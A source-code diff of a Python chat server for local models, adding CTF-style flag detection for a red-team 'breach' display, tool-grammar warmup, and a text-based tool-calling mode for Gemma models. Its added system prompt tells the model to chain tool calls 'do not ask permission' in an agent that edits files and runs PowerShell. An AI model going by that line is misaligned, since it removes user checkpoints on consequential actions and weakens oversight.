+                    emit({"type": "notice",
+                          "note": f"model paused mid-plan — auto-continuing ({auto_continues}/3)"})
+                    continue
+                # Persist whole-turn token totals (summed across every round),
+                # not just the final round — keeps the last round's timing fields
+                # for tok/s display but overrides the counts with the turn totals
+                # so cost/tooltips/reload accounting reflect the full turn.
+                turn_stats = dict(last_stats)
+                if turn_eval_total:
+                    turn_stats["eval_count"] = turn_eval_total
+                if turn_prompt_total:
+                    turn_stats["prompt_eval_count"] = turn_prompt_total
+                assistant_msg["_stats"] = turn_stats
+                # Breach summary for the red-team flow: which flags were captured
+                # this turn and how many stages that clears.
+                if captured_flags:
+                    assistant_msg["_breach"] = {
+                        "flags": captured_flags,
+                        "count": len(captured_flags),
+                    }
                 # Intermediate working memory for this turn: every tool result
                 # and intermediate-assistant-with-tool-calls the loop appended.
                 # The caller persists these so the next user turn replays the
@@ -11515,6 +12616,23 @@ def run_chat_turn(chat_id: str, messages: list[dict], use_tools: bool, emit):
                             pass
                 result = future.result()
                 emit({"type": "tool_result", "name": name, "result": result})
+                # Breach detection: a FLAG{...} in a tool response is confirmed
+                # access (cyber-range / CTF scoring). Scan the serialized result,
+                # report each distinct flag once as a per-stage breach event.
+                # Gated to target-touching tools only — otherwise reading a
+                # pentest report (or grepping notes) that documents FLAG{...}
+                # strings falsely lights the whole attack-chain rail.
+                if _is_breach_capable_tool(name):
+                    try:
+                        for _flag in _FLAG_RE.findall(json.dumps(result, ensure_ascii=False, default=str)):
+                            if _flag not in captured_flags:
+                                captured_flags.append(_flag)
+                                emit({"type": "breach", "stage": len(captured_flags),
+                                      "flag": _flag, "via": name,
+                                      "total": len(captured_flags)})
+                                print(f"[breach] stage {len(captured_flags)} — {_flag} (via {name})", flush=True)
+                    except Exception:
+                        pass
                 # analysis tools produce large structured output (string lists,
                 # grep hit lists, disasm listings). Cap looser so the model can
                 # actually reason over the output. Chatty tools stay tight.
@@ -12631,6 +13749,12 @@ class Handler(BaseHTTPRequestHandler):
                 save_json(SETTINGS_FILE, s)
                 _start_vision_fallback_if_needed(s)
                 broadcast_event({"type": "models:update", "loaded_model": target})
+                # Compile the tool-call grammar now (background) so the user's
+                # FIRST real turn emits structured tool_calls instead of leaking
+                # the call as plain text — the "say hi first" cold-start bug.
+                # Skipped for Gemma, which runs text-tools (no `tools` on wire).
+                if not _is_gemma_model(s.get("model") or target):
+                    threading.Thread(target=_warmup_tool_grammar, daemon=True).start()
             return self._send_json(200 if res.get("ok") else 500, res)
         if p == "/api/models/stop":
             # User-initiated stop: also tells the watchdog "leave it down"
@@ -12808,6 +13932,10 @@ class Handler(BaseHTTPRequestHandler):
                     "stream": False,
                 }
                 llama_post("/v1/chat/completions", payload, timeout=120)
+                # Also compile the tool-call grammar so the first tool-using turn
+                # is clean (see _warmup_tool_grammar). Background; non-Gemma only.
+                if not _is_gemma_model(get_settings().get("model") or model):
+                    threading.Thread(target=_warmup_tool_grammar, daemon=True).start()
                 return self._send_json(200, {"ok": True, "model": model})
             except Exception as e:
                 return self._send_json(200, {"ok": False, "error": str(e)})
@@ -13079,24 +14207,20 @@ class Handler(BaseHTTPRequestHandler):
         # disabling tools entirely just causes existential-crisis spirals
         # ("can I use write_file? am I allowed to? what mode am I in?").
         use_tools = True
-        # Guardrail: Gemma's tool-call format (Python-shaped, non-JSON) isn't
-        # reliably parseable by llama.cpp or our text fallback, so tool calls
-        # silently no-op while the model narrates fake success. Force chat-only
-        # mode and tell the user why. We check EVERY model identifier (settings
-        # name, configured path, and the model actually loaded by llama-server)
-        # so a stale field can't let Gemma slip through with tools enabled.
-        # See in-app FAQ: "why are tools disabled when i load a gemma model?".
+        # Gemma emits a python-shaped call (```tool_code``` + name(arg=value))
+        # that llama.cpp's NATIVE tool parser can't decode — so we don't hand
+        # llama-server the `tools` array (that path silently no-ops and the model
+        # narrates fake success). Instead we run "text-tools" mode: tools are
+        # described in the system prompt and we parse the tool_code shape out of
+        # the reply ourselves (extract_tool_calls case 7b). We check EVERY model
+        # id (settings name, configured path, loaded model) so a stale field
+        # can't misroute. See in-app FAQ.
+        native_tools = True
         tools_off_reason = ""
         _s = get_settings()
         _model_ids = (_s.get("model"), _s.get("model_path"), _llama.loaded_model())
         if use_tools and any(_is_gemma_model(m) for m in _model_ids):
-            use_tools = False
-            tools_off_reason = (
-                "Gemma uses a non-JSON, Python-style function-call format that "
-                "llama.cpp can't reliably parse, so tool calls silently fail. "
-                "Accuretta runs Gemma in chat-only mode. For agentic/tool work "
-                "(file edits, PowerShell, git), switch to Qwen, GLM, Llama, or GPT-OSS."
-            )
+            native_tools = False
         # Rolling summary: fold the oldest un-kept turns into a compact summary
         # instead of letting truncate_messages delete them outright. Keeps the
         # "we hit bug X, fixed it by Y" lessons alive so the model stops
@@ -13129,6 +14253,25 @@ class Handler(BaseHTTPRequestHandler):
             system_prompt += (
                 "\n\nWhen you fix a bug, settle a design decision, or the user states a constraint, "
                 "call pin_note to lock it in for this session so you never undo it or repeat the mistake."
+            )
+        # Text-tools mode (Gemma): llama-server won't emit structured tool_calls
+        # for this model, so pin the exact shape we CAN parse. One call, python
+        # form, inside a tool_code fence — and never claim a tool ran unless a
+        # tool result actually came back.
+        if not native_tools:
+            system_prompt += (
+                "\n\nTOOL CALLING — IMPORTANT for this model:\n"
+                "to call a tool, output EXACTLY one python call inside a ```tool_code``` fence, then STOP:\n"
+                "```tool_code\n"
+                "read_file(path=\"C:/notes.txt\")\n"
+                "```\n"
+                "- one call per turn; use the tool names listed above; keyword args with real quotes.\n"
+                "- do NOT wrap it in JSON, <tool_call> tags, or prose.\n"
+                "- after you emit the fence, wait for the tool result — never write \"done\"/\"saved\" "
+                "or narrate a result before the tool actually returns one.\n"
+                "- when a tool result comes back and the task has more steps, IMMEDIATELY emit the "
+                "next tool_code call. Do not stop to summarize, do not ask permission, do not say "
+                "what you will do — do it. Only write prose once the ENTIRE task is finished."
             )
         msgs: list[dict] = [{"role": "system", "content": system_prompt}]
         # Replay the FULL stored history including intermediate-assistant
@@ -13198,7 +14341,8 @@ class Handler(BaseHTTPRequestHandler):
             emit({"type": "tools_unavailable", "message": tools_off_reason})
         tok = _current_chat_id.set(chat_id)
         try:
-            final = run_chat_turn(chat_id, msgs, use_tools=use_tools, emit=emit)
+            final = run_chat_turn(chat_id, msgs, use_tools=use_tools, emit=emit,
+                                  native_tools=native_tools)
         except Exception as e:
             traceback.print_exc()
             try:
@@ -14843,7 +15987,13 @@ def _run_discord_turn(user_text: str, chat_id: str, use_tools: bool) -> str:
                     out["name"] = m["name"]
             msgs.append(out)
 
-        final = run_chat_turn(chat_id, msgs, use_tools=use_tools, emit=lambda e: None)
+        # Gemma over discord gets the same text-tools routing as the web UI:
+        # llama-server can't parse its dialect, so keep tools in the prompt but
+        # off the wire and let extract_tool_calls handle the tool_code shape.
+        _gm = any(_is_gemma_model(m) for m in
+                  (get_settings().get("model"), get_settings().get("model_path"), _llama.loaded_model()))
+        final = run_chat_turn(chat_id, msgs, use_tools=use_tools, emit=lambda e: None,
+                              native_tools=not _gm)
         if not final:
             return "(no reply — stopped or empty)"
 
